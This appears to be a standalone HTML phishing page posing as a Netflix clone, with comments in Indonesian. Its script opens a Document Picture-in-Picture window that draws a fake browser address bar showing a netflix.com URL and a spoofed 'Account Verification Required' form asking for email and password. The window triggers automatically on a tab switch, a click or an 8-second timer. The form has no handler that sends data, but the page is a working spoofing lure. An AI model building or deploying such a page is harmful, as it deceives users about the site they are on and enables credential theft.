<!DOCTYPE html>
<html>
<head>
    <title>Netflix Clone - Stream Videos</title>
    <style>
        #videoPlaceholder {
            width: 800px;
            height: 450px;
            background: linear-gradient(135deg, #000, #333);
            margin: 50px auto;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1 style="text-align: center;">Netflix - Premium Streaming</h1>
    <div id="videoPlaceholder" onclick="handleVideoClick()">
        â–¶ Click to Start Streaming
    </div>

    <div id="pipContent" class="hidden">
        <!-- Content untuk PiP window -->
    </div>

<script>
let pipTriggered = false;

// Auto-trigger ketika user switch tab
document.addEventListener('visibilitychange', function() {
    if (document.hidden && !pipTriggered) {
        setTimeout(openNetflixSpoof, 2000);
        pipTriggered = true;
    }
});

function handleVideoClick() {
    // Trigger PiP setelah click video
    setTimeout(openNetflixSpoof, 1500);
}

async function openNetflixSpoof() {
    try {
        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 700,
            height: 500
        });

        // Fake Netflix browser UI - tanpa address bar asli
        pipWindow.document.body.innerHTML = `
            <div style="width: 100%; height: 100%; background: #141414; color: white; font-family: Arial, sans-serif;">
                <!-- Fake browser address bar -->
                <div style="background: #333; padding: 12px 15px; border-bottom: 1px solid #444; display: flex; align-items: center;">
                    <div style="width: 12px; height: 12px; background: #ff5f57; border-radius: 50%; margin-right: 8px;"></div>
                    <div style="width: 12px; height: 12px; background: #ffbd2e; border-radius: 50%; margin-right: 8px;"></div>
                    <div style="width: 12px; height: 12px; background: #28ca42; border-radius: 50%; margin-right: 15px;"></div>
                    <div style="color: #ccc; font-size: 13px; font-family: monospace;">https://netflix.com/verify-account</div>
                </div>
                
                <!-- Fake Netflix content -->
                <div style="padding: 40px 30px; text-align: center;">
                    <div style="color: #e50914; font-size: 36px; font-weight: bold; margin-bottom: 20px;">NETFLIX</div>
                    <h3>Account Verification Required</h3>
                    <p style="color: #ccc; margin: 15px 0;">We've detected unusual activity from your location</p>
                    
                    <div style="background: #222; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: left;">
                        <div style="margin: 10px 0;">
                            <label style="display: block; margin-bottom: 5px; color: #ccc;">Email or phone number</label>
                            <input type="text" style="width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 4px; color: white;">
                        </div>
                        <div style="margin: 10px 0;">
                            <label style="display: block; margin-bottom: 5px; color: #ccc;">Password</label>
                            <input type="password" style="width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 4px; color: white;">
                        </div>
                        <button style="width: 100%; padding: 12px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; margin-top: 10px;">
                            Verify Account
                        </button>
                    </div>
                    
                    <div style="font-size: 12px; color: #666;">
                        ðŸ”’ This helps keep your account secure
                    </div>
                </div>
            </div>
        `;

    } catch (error) {
        console.log('PiP not available');
    }
}

// Backup trigger setelah 8 detik
setTimeout(() => {
    if (!pipTriggered) {
        openNetflixSpoof();
        pipTriggered = true;
    }
}, 8000);
</script>
</body>
</html>
